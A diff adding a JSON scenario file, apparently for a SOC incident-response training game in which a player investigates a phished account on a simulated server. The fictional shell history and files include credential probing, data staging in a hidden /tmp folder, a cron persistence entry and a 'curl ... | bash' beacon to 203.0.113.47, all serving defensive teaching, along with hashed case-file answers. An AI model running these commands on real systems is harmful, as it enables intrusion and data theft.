@@ -1,0 +1,1021 @@
+{
+  "night": 2,
+  "title": "Night 2: The Terminal",
+  "shiftDate": "2026-11-28",
+  "config": {
+    "shiftStartHour": 0,
+    "shiftEndHour": 6,
+    "minutesPerCommand": 5,
+    "chargeUnknownCommands": false,
+    "freeCommands": [
+      "help",
+      "clear",
+      "history"
+    ],
+    "clockWarningsMinutesLeft": [
+      60,
+      15
+    ],
+    "maxInputLength": 200,
+    "scrollbackLines": 2000,
+    "tooltips": "caseFileOnly",
+    "xp": {
+      "correctAnswer": 100,
+      "wrongAnswer": -75,
+      "clueFound": 25
+    },
+    "ranks": [
+      {
+        "name": "Intern",
+        "minPercent": 0
+      },
+      {
+        "name": "Tier 1 Analyst",
+        "minPercent": 40
+      },
+      {
+        "name": "Tier 2 Analyst",
+        "minPercent": 70
+      },
+      {
+        "name": "Night Shift Lead",
+        "minPercent": 90
+      }
+    ],
+    "noise": {
+      "bruteForceAttempts": 210
+    },
+    "autoSubmitAtShiftEnd": true
+  },
+  "briefing": {
+    "caseId": "KL-IR-2026-0047",
+    "server": "kl-rpt-01",
+    "priority": "High",
+    "from": "Rhea Vance, SOC Manager",
+    "paragraphs": [
+      "Remember the \"password expires in 24 hours\" email Jordan Pike forwarded last night? Jordan came in this afternoon and admitted clicking the link before forwarding it, and typing their password into the page.",
+      "IT reset the password at 4:50 PM. But the dispatch reporting server, kl-rpt-01, takes the same company login, and it's reachable from outside. Find out whether anyone used Jordan's account there.",
+      "You have a read-only forensic session. The server is evidence: nothing you type can change it. Your case notes are in your home folder.",
+      "Every command you run takes time. Fill out the case file before 6 AM, when it goes to the day crew as is."
+    ]
+  },
+  "host": {
+    "hostname": "kl-rpt-01",
+    "user": "soc-analyst",
+    "id": "uid=1004(soc-analyst) gid=1004(soc-analyst) groups=1004(soc-analyst),4(adm),1100(forensics)",
+    "timezone": "EST",
+    "firstPid": 10012,
+    "homes": {
+      "root": "/root",
+      "jpike": "/home/jpike",
+      "mreyes": "/home/mreyes",
+      "soc-analyst": "/home/soc-analyst",
+      "svc-backup": "/var/lib/kl-backup",
+      "dispatch": "/srv/dispatch",
+      "postgres": "/var/lib/postgresql"
+    },
+    "loginBanner": [
+      "Kestrel Logistics · kl-rpt-01 (dispatch reporting)",
+      "Authorized use only. All activity is logged and reviewed by the Security Operations Center.",
+      "",
+      "Forensic session: read-only. Case KL-IR-2026-0047.",
+      "Last login: Wed Nov 18 14:22:09 2026 from 10.40.9.7"
+    ]
+  },
+  "fs": {
+    "/etc": {
+      "type": "dir"
+    },
+    "/etc/motd": {
+      "mtime": "Oct 02 10:14",
+      "lines": [
+        "Kestrel Logistics · kl-rpt-01 (dispatch reporting)",
+        "Authorized use only. All activity is logged and reviewed by the Security Operations Center.",
+        "Owner: Dispatch Systems · Support: IT Service Desk, ext. 4400"
+      ]
+    },
+    "/etc/passwd": {
+      "mtime": "Nov 02 15:40",
+      "lines": [
+        "root:x:0:0:root:/root:/bin/bash",
+        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
+        "syslog:x:104:110::/home/syslog:/usr/sbin/nologin",
+        "sshd:x:110:65534::/run/sshd:/usr/sbin/nologin",
+        "postgres:x:113:120:PostgreSQL administrator:/var/lib/postgresql:/bin/bash",
+        "svc-backup:x:998:998:Kestrel backup service:/var/lib/kl-backup:/usr/sbin/nologin",
+        "dispatch:x:999:999:Dispatch reporting daemon:/srv/dispatch:/usr/sbin/nologin",
+        "jpike:x:1001:1001:Jordan Pike,Dispatch:/home/jpike:/bin/bash",
+        "mreyes:x:1002:1002:Maria Reyes,Dispatch:/home/mreyes:/bin/bash",
+        "soc-analyst:x:1004:1004:SOC night shift (forensic, read-only):/home/soc-analyst:/bin/bash"
+      ]
+    },
+    "/etc/shadow": {
+      "denied": true,
+      "group": "shadow",
+      "mode": "-rw-r-----",
+      "mtime": "Nov 02 15:40",
+      "size": 1214
+    },
+    "/etc/crontab": {
+      "mtime": "Oct 02 10:14",
+      "lines": [
+        "# System-wide crontab for kl-rpt-01.",
+        "# Entries here name the user each job runs as. Per-user crontabs",
+        "# live in /var/spool/cron/crontabs and are edited with crontab -e.",
+        "SHELL=/bin/sh",
+        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
+        "",
+        "# m  h  dom mon dow  user  command",
+        "17 *    * * *    root  cd / && run-parts --report /etc/cron.hourly",
+        "25 6    * * *    root  cd / && run-parts --report /etc/cron.daily",
+        "47 6    * * 7    root  cd / && run-parts --report /etc/cron.weekly"
+      ]
+    },
+    "/etc/profile.d": {
+      "type": "dir"
+    },
+    "/etc/profile.d/kestrel-audit.sh": {
+      "mtime": "Sep 14 11:02",
+      "lines": [
+        "# Kestrel Logistics shell audit policy (SEC-STD-114)",
+        "# Applies to every interactive login on Kestrel Linux servers.",
+        "#",
+        "# Append each command to ~/.bash_history as soon as it runs, instead of",
+        "# only at logout. History then survives dropped sessions, and clearing",
+        "# the in-memory history (history -c) can't erase what's already written.",
+        "shopt -s histappend",
+        "export PROMPT_COMMAND='history -a'",
+        "readonly PROMPT_COMMAND"
+      ]
+    },
+    "/root": {
+      "type": "dir",
+      "denied": true,
+      "mode": "drwx------"
+    },
+    "/home": {
+      "type": "dir"
+    },
+    "/home/soc-analyst": {
+      "type": "dir",
+      "owner": "soc-analyst",
+      "mtime": "Nov 28 00:00"
+    },
+    "/home/soc-analyst/CASE-README.txt": {
+      "owner": "soc-analyst",
+      "mtime": "Nov 27 23:48",
+      "lines": [
+        "CASE KL-IR-2026-0047 · kl-rpt-01",
+        "Opened by: R. Vance, SOC Manager",
+        "",
+        "You have a read-only forensic session on kl-rpt-01. Nothing you type can",
+        "change the server, so look anywhere you like.",
+        "",
+        "Jordan Pike typed their password into a phishing page early Friday, Nov 27.",
+        "IT reset it at 4:50 PM Friday. Find out if anyone used it on this server",
+        "before then, and what they left behind.",
+        "",
+        "Fill out the case file:",
+        "  1. The account the attacker logged in with",
+        "  2. The IP address they came from",
+        "  3. The commands they ran",
+        "  4. How they plan to get back in",
+        "  5. Where they staged data to steal",
+        "",
+        "Where I'd start: the system logs are in /var/log. Type help for commands.",
+        "Files whose names start with a dot are hidden from a plain ls.",
+        "",
+        "For this case the forensic account can read system folders that real servers",
+        "usually keep root-only, such as /var/spool/cron (every user's crontab).",
+        "",
+        "- RV"
+      ]
+    },
+    "/home/jpike": {
+      "type": "dir",
+      "owner": "jpike",
+      "mode": "drwxr-x---",
+      "mtime": "Nov 27 03:37"
+    },
+    "/home/jpike/.bashrc": {
+      "owner": "jpike",
+      "mtime": "Mar 03 09:20",
+      "lines": [
+        "# ~/.bashrc: run for interactive shells",
+        "HISTSIZE=1000",
+        "HISTFILESIZE=2000",
+        "alias ll='ls -l'",
+        "export PATH=\"$HOME/.local/bin:$PATH\""
+      ]
+    },
+    "/home/jpike/.bash_history": {
+      "owner": "jpike",
+      "mode": "-rw-------",
+      "mtime": "Nov 27 03:41",
+      "lines": [
+        "cd route_reports",
+        "ls -l",
+        "cat route_summary_1125.csv",
+        "cd ~",
+        "python3 /srv/dispatch/tools/route_report.py --date 2026-11-26 --out route_reports/",
+        "ls route_reports",
+        "exit",
+        "whoami",
+        "id",
+        "uname -a",
+        "sudo cat /etc/shadow",
+        "ls -la /srv/dispatch/exports",
+        "mkdir -p /tmp/.cache-x",
+        "cp /srv/dispatch/exports/customers_2026Q4.csv /srv/dispatch/exports/driver_roster.csv /tmp/.cache-x/",
+        "cd /tmp/.cache-x",
+        "tar czf sys-update.tgz customers_2026Q4.csv driver_roster.csv",
+        "rm customers_2026Q4.csv driver_roster.csv",
+        "ls -la",
+        "mkdir -p ~/.local/share",
+        "curl -s -o ~/.local/share/.sysd-update.sh http://203.0.113.47:8443/s",
+        "chmod +x ~/.local/share/.sysd-update.sh",
+        "(crontab -l 2>/dev/null; echo \"*/15 * * * * /home/jpike/.local/share/.sysd-update.sh >/dev/null 2>&1\") | crontab -",
+        "crontab -l",
+        "exit"
+      ]
+    },
+    "/home/jpike/.local": {
+      "type": "dir",
+      "owner": "jpike",
+      "mtime": "Nov 27 03:37"
+    },
+    "/home/jpike/.local/share": {
+      "type": "dir",
+      "owner": "jpike",
+      "mtime": "Nov 27 03:38"
+    },
+    "/home/jpike/.local/share/.sysd-update.sh": {
+      "owner": "jpike",
+      "mode": "-rwxr-xr-x",
+      "mtime": "Nov 27 03:38",
+      "lines": [
+        "#!/bin/bash",
+        "# sysd-update: system keepalive",
+        "exec 9>/tmp/.cache-x/.lock",
+        "flock -n 9 || exit 0",
+        "H=$(hostname)",
+        "while true; do",
+        "  curl -s -m 10 \"http://203.0.113.47:8443/k?h=$H\" | bash",
+        "  sleep 840",
+        "done"
+      ]
+    },
+    "/home/jpike/notes.txt": {
+      "owner": "jpike",
+      "mtime": "Nov 25 17:02",
+      "lines": [
+        "route report: python3 /srv/dispatch/tools/route_report.py --date YYYY-MM-DD --out route_reports/",
+        "working from home: connect the VPN first (you get a 10.40.x address)",
+        "  IT says if the VPN is down, this box takes logins from outside too",
+        "Thanksgiving: covering 2 to 5 PM for Maria",
+        "ask Sam for October route utilization numbers"
+      ]
+    },
+    "/home/jpike/route_reports": {
+      "type": "dir",
+      "owner": "jpike",
+      "mtime": "Nov 26 14:10"
+    },
+    "/home/jpike/route_reports/route_summary_1125.csv": {
+      "owner": "jpike",
+      "mtime": "Nov 25 16:40",
+      "lines": [
+        "date,route,driver_id,stops,miles,on_time_pct",
+        "2026-11-25,R-104,D-2231,18,142.6,94",
+        "2026-11-25,R-107,D-1980,22,166.0,88",
+        "2026-11-25,R-112,D-2417,15,121.3,100",
+        "2026-11-25,R-118,D-2054,19,150.8,91"
+      ]
+    },
+    "/home/jpike/route_reports/route_summary_1126.csv": {
+      "owner": "jpike",
+      "mtime": "Nov 26 14:10",
+      "lines": [
+        "date,route,driver_id,stops,miles,on_time_pct",
+        "2026-11-26,R-104,D-2231,9,88.2,100",
+        "2026-11-26,R-112,D-2417,7,70.5,100"
+      ]
+    },
+    "/home/mreyes": {
+      "type": "dir",
+      "owner": "mreyes",
+      "mode": "drwxr-x---",
+      "mtime": "Nov 27 15:20"
+    },
+    "/home/mreyes/.bashrc": {
+      "owner": "mreyes",
+      "mtime": "Mar 03 09:20",
+      "lines": [
+        "# ~/.bashrc: run for interactive shells",
+        "HISTSIZE=1000",
+        "alias ll='ls -l'"
+      ]
+    },
+    "/home/mreyes/.bash_history": {
+      "owner": "mreyes",
+      "mode": "-rw-------",
+      "mtime": "Nov 27 15:22",
+      "lines": [
+        "ls",
+        "cd /srv/dispatch/exports",
+        "ls -l",
+        "cp fuel_card_usage.csv ~/fuel_audit_nov.csv",
+        "cd ~",
+        "ls",
+        "exit",
+        "ls",
+        "cat TODO.txt",
+        "python3 /srv/dispatch/tools/route_report.py --date 2026-11-27 --out ~/",
+        "ls",
+        "exit"
+      ]
+    },
+    "/home/mreyes/TODO.txt": {
+      "owner": "mreyes",
+      "mtime": "Nov 26 09:20",
+      "lines": [
+        "- November fuel card audit to Finance by Monday (copy of fuel_card_usage.csv is in my home folder)",
+        "- Thanksgiving coverage: Jordan has 2 to 5 PM"
+      ]
+    },
+    "/home/mreyes/fuel_audit_nov.csv": {
+      "owner": "mreyes",
+      "mtime": "Nov 26 09:31",
+      "size": 1903350,
+      "lines": [
+        "date,card_id,vehicle,gallons,amount_usd,station_city",
+        "2026-11-02,FC-0412,TRK-118,61.2,214.81,Dayton",
+        "2026-11-02,FC-0377,TRK-104,55.8,195.86,Columbus",
+        "2026-11-03,FC-0412,TRK-118,58.9,206.74,Springfield",
+        "[... 21,201 more rows not shown in this session]"
+      ]
+    },
+    "/home/mreyes/route_summary_1127.csv": {
+      "owner": "mreyes",
+      "mtime": "Nov 27 15:18",
+      "lines": [
+        "date,route,driver_id,stops,miles,on_time_pct",
+        "2026-11-27,R-104,D-2231,17,139.9,94",
+        "2026-11-27,R-107,D-1980,21,160.4,90"
+      ]
+    },
+    "/opt/dispatch/bin/rptd": {
+      "owner": "root",
+      "mode": "-rwxr-xr-x",
+      "mtime": "Aug 18 13:55",
+      "binary": "ELF 64-bit executable",
+      "size": 8412304
+    },
+    "/srv/dispatch": {
+      "type": "dir",
+      "owner": "dispatch"
+    },
+    "/srv/dispatch/config": {
+      "type": "dir",
+      "owner": "dispatch"
+    },
+    "/srv/dispatch/config/rptd.conf": {
+      "owner": "dispatch",
+      "mtime": "Aug 18 14:02",
+      "lines": [
+        "[server]",
+        "listen = 127.0.0.1:8090",
+        "exports_dir = /srv/dispatch/exports",
+        "export_time = 23:00",
+        "",
+        "[database]",
+        "host = 127.0.0.1",
+        "name = dispatch_reports",
+        "user = rptd",
+        "password_file = /srv/dispatch/config/.db_pass"
+      ]
+    },
+    "/srv/dispatch/config/.db_pass": {
+      "owner": "dispatch",
+      "denied": true,
+      "mode": "-rw-------",
+      "mtime": "Aug 18 14:02",
+      "size": 33
+    },
+    "/srv/dispatch/exports": {
+      "type": "dir",
+      "owner": "dispatch",
+      "mtime": "Nov 27 23:00"
+    },
+    "/srv/dispatch/exports/customers_2026Q4.csv": {
+      "owner": "dispatch",
+      "mtime": "Nov 27 23:00",
+      "size": 1284551,
+      "lines": [
+        "account_id,company,city,contact_name,contact_phone,credit_terms",
+        "C-10022,Bramblewood Farm Supply,Dayton,Ellen Marsh,(937) 555-0142,NET30",
+        "C-10031,Northgate Appliance Outlet,Columbus,Ravi Shah,(614) 555-0187,NET45",
+        "C-10047,Copperline Hardware Co.,Springfield,Tom Briggs,(937) 555-0119,NET30",
+        "C-10058,Lakeshore Paper Goods,Toledo,Ana Ruiz,(419) 555-0163,NET60",
+        "[... 8,935 more rows not shown in this session]"
+      ]
+    },
+    "/srv/dispatch/exports/driver_roster.csv": {
+      "owner": "dispatch",
+      "mtime": "Nov 27 23:00",
+      "size": 96210,
+      "lines": [
+        "driver_id,name,license_class,license_no,phone,home_terminal",
+        "D-1980,Curtis Webb,CDL-A,OH-DL-XX4471,(614) 555-0101,Columbus",
+        "D-2054,Lena Ortiz,CDL-A,OH-DL-XX9032,(937) 555-0154,Dayton",
+        "D-2231,Marcus Doyle,CDL-B,OH-DL-XX1186,(937) 555-0178,Dayton",
+        "D-2417,Priya Kumar,CDL-A,OH-DL-XX6620,(419) 555-0133,Toledo",
+        "[... 607 more rows not shown in this session]"
+      ]
+    },
+    "/srv/dispatch/exports/fuel_card_usage.csv": {
+      "owner": "dispatch",
+      "mtime": "Nov 27 23:00",
+      "size": 1911842,
+      "lines": [
+        "date,card_id,vehicle,gallons,amount_usd,station_city",
+        "2026-11-02,FC-0412,TRK-118,61.2,214.81,Dayton",
+        "2026-11-02,FC-0377,TRK-104,55.8,195.86,Columbus",
+        "[... 21,374 more rows not shown in this session]"
+      ]
+    },
+    "/srv/dispatch/tools": {
+      "type": "dir",
+      "owner": "dispatch"
+    },
+    "/srv/dispatch/tools/route_report.py": {
+      "owner": "dispatch",
+      "mode": "-rwxr-xr-x",
+      "mtime": "Jun 09 10:31",
+      "lines": [
+        "#!/usr/bin/env python3",
+        "\"\"\"Daily route summary for dispatch. Reads the reporting database, writes a CSV.\"\"\"",
+        "import argparse, csv, datetime",
+        "",
+        "def main():",
+        "    parser = argparse.ArgumentParser()",
+        "    parser.add_argument(\"--date\", required=True)",
+        "    parser.add_argument(\"--out\", default=\".\")",
+        "    args = parser.parse_args()",
+        "    # ... query and write route_summary_MMDD.csv",
+        "",
+        "if __name__ == \"__main__\":",
+        "    main()"
+      ]
+    },
+    "/tmp": {
+      "type": "dir",
+      "mode": "drwxrwxrwt",
+      "mtime": "Nov 27 23:00"
+    },
+    "/tmp/.X11-unix": {
+      "type": "dir",
+      "mode": "drwxrwxrwt"
+    },
+    "/tmp/.ICE-unix": {
+      "type": "dir",
+      "mode": "drwxrwxrwt"
+    },
+    "/tmp/rptd.lock": {
+      "owner": "dispatch",
+      "mtime": "Nov 20 06:03",
+      "lines": [
+        "702"
+      ]
+    },
+    "/tmp/.cache-x": {
+      "type": "dir",
+      "owner": "jpike",
+      "mtime": "Nov 27 03:45"
+    },
+    "/tmp/.cache-x/sys-update.tgz": {
+      "owner": "jpike",
+      "mtime": "Nov 27 03:33",
+      "binary": "gzip compressed data",
+      "size": 412883
+    },
+    "/tmp/.cache-x/.lock": {
+      "owner": "jpike",
+      "mtime": "Nov 27 03:45",
+      "lines": []
+    },
+    "/usr/local/bin/kl-backup": {
+      "mode": "-rwxr-xr-x",
+      "mtime": "Oct 02 10:10",
+      "lines": [
+        "#!/bin/sh",
+        "# Kestrel nightly backup wrapper (CHG-1873). Sends /srv and /home to the backup server.",
+        "exec /usr/bin/rsync -a --delete /srv /home \"$3\"::kl-rpt-01/"
+      ]
+    },
+    "/var/log": {
+      "type": "dir",
+      "group": "syslog",
+      "mode": "drwxrwxr-x",
+      "mtime": "Nov 28 00:00"
+    },
+    "/var/log/auth.log": {
+      "owner": "syslog",
+      "group": "adm",
+      "mode": "-rw-r-----",
+      "mtime": "Nov 28 00:00",
+      "sortByTime": true,
+      "lines": [
+        "Nov 26 06:25:01 kl-rpt-01 sshd[512]: Server listening on 0.0.0.0 port 22.",
+        "Nov 26 09:12:40 kl-rpt-01 sshd[1188]: Accepted password for mreyes from 10.40.12.31 port 52211 ssh2",
+        "Nov 26 09:12:40 kl-rpt-01 sshd[1188]: pam_unix(sshd:session): session opened for user mreyes(uid=1002) by (uid=0)",
+        "Nov 26 11:40:05 kl-rpt-01 sshd[1188]: pam_unix(sshd:session): session closed for user mreyes",
+        "Nov 26 14:02:17 kl-rpt-01 sshd[1342]: Accepted password for jpike from 10.40.12.88 port 50934 ssh2",
+        "Nov 26 14:02:17 kl-rpt-01 sshd[1342]: pam_unix(sshd:session): session opened for user jpike(uid=1001) by (uid=0)",
+        "Nov 26 16:48:52 kl-rpt-01 sshd[1342]: pam_unix(sshd:session): session closed for user jpike",
+        "Nov 27 01:30:01 kl-rpt-01 CRON[2210]: pam_unix(cron:session): session opened for user svc-backup(uid=998) by (uid=0)",
+        "Nov 27 01:31:44 kl-rpt-01 CRON[2210]: pam_unix(cron:session): session closed for user svc-backup",
+        "Nov 27 03:14:09 kl-rpt-01 sshd[3318]: Failed password for jpike from 203.0.113.47 port 51118 ssh2",
+        "Nov 27 03:14:22 kl-rpt-01 sshd[3321]: Accepted password for jpike from 203.0.113.47 port 51122 ssh2",
+        "Nov 27 03:14:22 kl-rpt-01 sshd[3321]: pam_unix(sshd:session): session opened for user jpike(uid=1001) by (uid=0)",
+        "Nov 27 03:16:48 kl-rpt-01 sudo:    jpike : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/jpike ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
+        "Nov 27 03:41:30 kl-rpt-01 sshd[3321]: pam_unix(sshd:session): session closed for user jpike",
+        "Nov 27 03:41:30 kl-rpt-01 sshd[3321]: Disconnected from user jpike 203.0.113.47 port 51122",
+        "Nov 27 13:05:11 kl-rpt-01 sshd[5102]: Accepted password for mreyes from 10.40.12.31 port 53002 ssh2",
+        "Nov 27 13:05:11 kl-rpt-01 sshd[5102]: pam_unix(sshd:session): session opened for user mreyes(uid=1002) by (uid=0)",
+        "Nov 27 15:22:40 kl-rpt-01 sshd[5102]: pam_unix(sshd:session): session closed for user mreyes",
+        "Nov 28 00:00:03 kl-rpt-01 sshd[9907]: Accepted publickey for soc-analyst from 10.40.9.7 port 61220 ssh2: ED25519 SHA256:pR4mK7vQ2xN8cT1bW9sL3dF6hJ0gY5aZ",
+        "Nov 28 00:00:03 kl-rpt-01 sshd[9907]: pam_unix(sshd:session): session opened for user soc-analyst(uid=1004) by (uid=0)"
+      ],
+      "generate": [
+        {
+          "template": "{stamp} kl-rpt-01 sshd[{pid}]: Failed password for {user} from 198.51.100.23 port {port} ssh2",
+          "start": "2026-11-26T22:10:04",
+          "countKey": "bruteForceAttempts",
+          "everySeconds": [
+            5,
+            12
+          ],
+          "pidStart": 1500,
+          "seed": 7,
+          "values": {
+            "user": [
+              "root",
+              "root",
+              "root",
+              "invalid user admin",
+              "invalid user oracle",
+              "invalid user ubuntu",
+              "invalid user test",
+              "invalid user deploy"
+            ]
+          }
+        },
+        {
+          "template": [
+            "{stamp} kl-rpt-01 CRON[{pid}]: pam_unix(cron:session): session opened for user jpike(uid=1001) by (uid=0)",
+            "{stamp} kl-rpt-01 CRON[{pid}]: pam_unix(cron:session): session closed for user jpike"
+          ],
+          "start": "2026-11-27T03:45:01",
+          "end": "2026-11-27T23:45:01",
+          "everySeconds": 900,
+          "pidStart": 3420,
+          "seed": 3
+        },
+        {
+          "template": [
+            "{stamp} kl-rpt-01 CRON[{pid}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
+            "{stamp} kl-rpt-01 CRON[{pid}]: pam_unix(cron:session): session closed for user root"
+          ],
+          "start": "2026-11-26T07:17:01",
+          "end": "2026-11-27T23:17:01",
+          "everySeconds": 3600,
+          "pidStart": 1260,
+          "seed": 5
+        }
+      ]
+    },
+    "/var/log/auth.log.1": {
+      "owner": "syslog",
+      "group": "adm",
+      "mode": "-rw-r-----",
+      "mtime": "Nov 26 06:25",
+      "lines": [
+        "Nov 20 06:02:40 kl-rpt-01 sshd[512]: Server listening on 0.0.0.0 port 22.",
+        "Nov 23 08:58:02 kl-rpt-01 sshd[30112]: Accepted password for mreyes from 10.40.12.31 port 50120 ssh2",
+        "Nov 23 08:58:02 kl-rpt-01 sshd[30112]: pam_unix(sshd:session): session opened for user mreyes(uid=1002) by (uid=0)",
+        "Nov 23 10:14:51 kl-rpt-01 sshd[30112]: pam_unix(sshd:session): session closed for user mreyes",
+        "Nov 24 13:30:44 kl-rpt-01 sshd[31877]: Accepted password for jpike from 10.40.12.88 port 49822 ssh2",
+        "Nov 24 13:30:44 kl-rpt-01 sshd[31877]: pam_unix(sshd:session): session opened for user jpike(uid=1001) by (uid=0)",
+        "Nov 24 15:02:19 kl-rpt-01 sshd[31877]: pam_unix(sshd:session): session closed for user jpike",
+        "Nov 25 14:11:08 kl-rpt-01 sshd[33410]: Accepted password for jpike from 10.40.12.88 port 50311 ssh2",
+        "Nov 25 14:11:08 kl-rpt-01 sshd[33410]: pam_unix(sshd:session): session opened for user jpike(uid=1001) by (uid=0)",
+        "Nov 25 16:45:37 kl-rpt-01 sshd[33410]: pam_unix(sshd:session): session closed for user jpike"
+      ]
+    },
+    "/var/log/syslog": {
+      "owner": "syslog",
+      "group": "adm",
+      "mode": "-rw-r-----",
+      "mtime": "Nov 28 00:00",
+      "sortByTime": true,
+      "lines": [
+        "Nov 26 06:25:01 kl-rpt-01 rsyslogd: rsyslogd was HUPed (log rotation)",
+        "Nov 26 23:00:02 kl-rpt-01 rptd[702]: nightly export complete: customers_2026Q4.csv (8,931 rows), driver_roster.csv (612 rows), fuel_card_usage.csv (21,204 rows)",
+        "Nov 27 01:30:01 kl-rpt-01 CRON[2210]: (svc-backup) CMD (/usr/local/bin/kl-backup --nightly --target backup01.kestrel.internal)",
+        "Nov 27 01:31:44 kl-rpt-01 kl-backup[2214]: nightly backup finished: 3.1 GB sent to backup01.kestrel.internal",
+        "Nov 27 03:39:52 kl-rpt-01 crontab[3398]: (jpike) REPLACE (jpike)",
+        "Nov 27 03:40:05 kl-rpt-01 crontab[3402]: (jpike) LIST (jpike)",
+        "Nov 27 03:45:01 kl-rpt-01 cron[488]: (jpike) RELOAD (crontabs/jpike)",
+        "Nov 27 23:00:02 kl-rpt-01 rptd[702]: nightly export complete: customers_2026Q4.csv (8,940 rows), driver_roster.csv (612 rows), fuel_card_usage.csv (21,377 rows)"
+      ],
+      "generate": [
+        {
+          "template": "{stamp} kl-rpt-01 CRON[{pid}]: (jpike) CMD (/home/jpike/.local/share/.sysd-update.sh >/dev/null 2>&1)",
+          "start": "2026-11-27T03:45:01",
+          "end": "2026-11-27T23:45:01",
+          "everySeconds": 900,
+          "pidStart": 3420,
+          "seed": 3
+        },
+        {
+          "template": "{stamp} kl-rpt-01 CRON[{pid}]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)",
+          "start": "2026-11-26T07:17:01",
+          "end": "2026-11-27T23:17:01",
+          "everySeconds": 3600,
+          "pidStart": 1260,
+          "seed": 5
+        }
+      ]
+    },
+    "/var/spool/cron/crontabs": {
+      "type": "dir",
+      "group": "crontab",
+      "mode": "drwx-wx--T",
+      "mtime": "Nov 27 03:39"
+    },
+    "/var/spool/cron/crontabs/jpike": {
+      "owner": "jpike",
+      "group": "crontab",
+      "mode": "-rw-------",
+      "mtime": "Nov 27 03:39",
+      "lines": [
+        "# DO NOT EDIT THIS FILE - edit the master and reinstall.",
+        "# (- installed on Fri Nov 27 03:39:52 2026)",
+        "*/15 * * * * /home/jpike/.local/share/.sysd-update.sh >/dev/null 2>&1"
+      ]
+    },
+    "/var/spool/cron/crontabs/svc-backup": {
+      "owner": "svc-backup",
+      "group": "crontab",
+      "mode": "-rw-------",
+      "mtime": "Oct 02 10:12",
+      "lines": [
+        "# DO NOT EDIT THIS FILE - edit the master and reinstall.",
+        "# Kestrel nightly backup, change CHG-1873, approved by IT Operations",
+        "30 1 * * * /usr/local/bin/kl-backup --nightly --target backup01.kestrel.internal"
+      ]
+    }
+  },
+  "last": {
+    "entries": [
+      {
+        "user": "soc-analyst",
+        "text": "soc-anal pts/0        10.40.9.7        Sat Nov 28 00:00   still logged in"
+      },
+      {
+        "user": "mreyes",
+        "text": "mreyes   pts/1        10.40.12.31      Fri Nov 27 13:05 - 15:22  (02:17)"
+      },
+      {
+        "user": "jpike",
+        "text": "jpike    pts/1        203.0.113.47     Fri Nov 27 03:14 - 03:41  (00:27)"
+      },
+      {
+        "user": "jpike",
+        "text": "jpike    pts/0        10.40.12.88      Thu Nov 26 14:02 - 16:48  (02:46)"
+      },
+      {
+        "user": "mreyes",
+        "text": "mreyes   pts/0        10.40.12.31      Thu Nov 26 09:12 - 11:40  (02:28)"
+      },
+      {
+        "user": "jpike",
+        "text": "jpike    pts/0        10.40.12.88      Wed Nov 25 14:11 - 16:45  (02:34)"
+      },
+      {
+        "user": "jpike",
+        "text": "jpike    pts/0        10.40.12.88      Tue Nov 24 13:30 - 15:02  (01:31)"
+      },
+      {
+        "user": "mreyes",
+        "text": "mreyes   pts/0        10.40.12.31      Mon Nov 23 08:58 - 10:14  (01:16)"
+      },
+      {
+        "user": "reboot",
+        "text": "reboot   system boot  5.15.0-126-gen   Fri Nov 20 06:02   still running"
+      }
+    ],
+    "footer": "wtmp begins Fri Nov 20 06:02:11 2026"
+  },
+  "ps": {
+    "shellPid": 9911,
+    "header": "USER         PID %CPU %MEM START   TIME COMMAND",
+    "rows": [
+      "root           1  0.0  0.1 Nov20   0:09 /sbin/init",
+      "root         488  0.0  0.0 Nov20   0:00 /usr/sbin/cron -f",
+      "root         512  0.0  0.1 Nov20   0:02 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
+      "syslog       530  0.0  0.0 Nov20   0:01 /usr/sbin/rsyslogd -n",
+      "postgres     611  0.0  1.2 Nov20   1:14 /usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/15/main",
+      "dispatch     702  0.3  2.1 Nov20  12:41 /opt/dispatch/bin/rptd --config /srv/dispatch/config/rptd.conf",
+      "jpike       3431  0.0  0.0 Nov27   0:00 /bin/bash /home/jpike/.local/share/.sysd-update.sh",
+      "jpike       9893  0.0  0.0 23:48   0:00 sleep 840",
+      "root        9907  0.0  0.1 00:00   0:00 sshd: soc-analyst [priv]",
+      "soc-ana+    9910  0.0  0.0 00:00   0:00 sshd: soc-analyst@pts/0",
+      "soc-ana+    9911  0.0  0.0 00:00   0:00 -bash"
+    ]
+  },
+  "clues": [
+    {
+      "id": "login",
+      "label": "Found the attacker's successful login in auth.log",
+      "match": [
+        {
+          "output": "Accepted password for jpike from 203.0.113.47",
+          "from": "/var/log/auth.log"
+        }
+      ]
+    },
+    {
+      "id": "history",
+      "label": "Read the attacker's commands in jpike's hidden shell history",
+      "match": [
+        {
+          "output": "sudo cat /etc/shadow",
+          "from": "/home/jpike/.bash_history"
+        },
+        {
+          "output": "mkdir -p /tmp/.cache-x",
+          "from": "/home/jpike/.bash_history"
+        },
+        {
+          "output": "tar czf sys-update.tgz",
+          "from": "/home/jpike/.bash_history"
+        },
+        {
+          "output": "curl -s -o ~/.local/share/.sysd-update.sh",
+          "from": "/home/jpike/.bash_history"
+        },
+        {
+          "output": "| crontab -",
+          "from": "/home/jpike/.bash_history"
+        }
+      ]
+    },
+    {
+      "id": "staging",
+      "label": "Found the hidden staging folder in /tmp",
+      "match": [
+        {
+          "shows": "/tmp/.cache-x"
+        }
+      ]
+    },
+    {
+      "id": "cron",
+      "label": "Found the malicious cron job",
+      "match": [
+        {
+          "output": "/home/jpike/.local/share/.sysd-update.sh",
+          "from": "/var/spool/cron/crontabs/jpike"
+        },
+        {
+          "output": "(jpike) CMD (/home/jpike/.local/share/.sysd-update.sh",
+          "from": "/var/log/syslog"
+        }
+      ]
+    },
+    {
+      "id": "script",
+      "label": "Read the hidden persistence script",
+      "match": [
+        {
+          "output": "# sysd-update: system keepalive",
+          "from": "/home/jpike/.local/share/.sysd-update.sh"
+        },
+        {
+          "output": "http://203.0.113.47:8443/k",
+          "from": "/home/jpike/.local/share/.sysd-update.sh"
+        }
+      ]
+    }
+  ],
+  "caseFile": [
+    {
+      "id": "account",
+      "type": "text",
+      "label": "Compromised account",
+      "prompt": "Which account did the attacker log in with?",
+      "help": "The username on kl-rpt-01, exactly as the server's logs show it.",
+      "answerHashes": [
+        "6e00993afbc4f357e74ddbf6e564533e5c0268db647728f09064a2e944897423"
+      ],
